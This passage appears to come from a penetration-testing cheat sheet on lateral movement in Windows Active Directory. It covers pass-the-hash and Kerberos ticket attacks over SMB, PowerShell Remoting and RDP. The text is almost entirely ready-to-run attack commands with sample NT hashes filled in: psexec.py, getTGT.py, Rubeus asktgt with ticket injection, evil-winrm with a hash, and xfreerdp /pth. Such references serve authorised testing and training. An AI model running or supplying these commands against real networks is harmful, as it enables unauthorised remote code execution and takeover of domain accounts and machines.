#### Using SMB (p445)
NTLM authentication 

- with Pass-The-Hash (NT ou LM).
```
psexec.py contoso.local/User@192.168.100.10 -hashes :cdeae556dc28c24b5b7b14e9df5b6e21
```
Kerberos authentication. Tickets format are different between Linux and Windows, ticket_converter or cerbero can be used to convert them. 
- with TGT request using PtH
```
getTGT.py contoso.local/User -dc-ip 192.168.100.2 -hashes :cdeae556dc28c24b5b7b14e9df5b6e21
export KRB5CCNAME=$(pwd)/User.ccache

# Hostname instead of IP is mandatory when connecting because it is used identify the service of the remote machine and provide the right ticket to authenticate against it.
psexec.py contoso.local/User@WS01-10 -target-ip 192.168.100.10 -k -no-pass
```

#### Using PowerShell Remoting (p5985)

- PowerShell on Windows, use Rubeus or Mimikatz to PtH

```
.\Rubeus.exe asktgt /user:Administrator /rc4:b73fdfe10e87b4ca5c0d957f81de6863 /ptt
Enter-PSSession -ComputerName dc01
```

- Evil-winrm on Linux, support PtH
```
evil-winrm -u user -p password -i 10.10.10.10
evil-winrm -u user -H <NT_hash> -i 10.10.10.10
```

#### Using RDP (p3389)

PtH possible only if restricted admin mode for RDP is enabled.
```
xfreerdp /u:Anakin@contoso.local /pth:cdeae556dc28c24b5b7b14e9df5b6e21 /v:192.168.122.14
```
On Windows, PtH using mimikatz or Rubeus
```
mstsc.exe /restrictedadmin
```
